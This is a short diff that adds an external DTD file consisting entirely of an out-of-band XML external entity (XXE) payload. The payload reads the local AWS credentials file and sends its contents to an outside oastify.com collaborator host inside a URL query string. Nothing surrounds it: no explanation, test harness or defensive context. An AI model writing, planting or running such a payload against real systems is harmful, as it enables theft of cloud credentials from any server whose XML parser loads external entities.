@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///.aws/credentials">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://39alzycqnx7t0w7oder6ogsfm6sxgr8fx.oastify.com/?x=%file;'>">
+%eval;
+%exfiltrate;
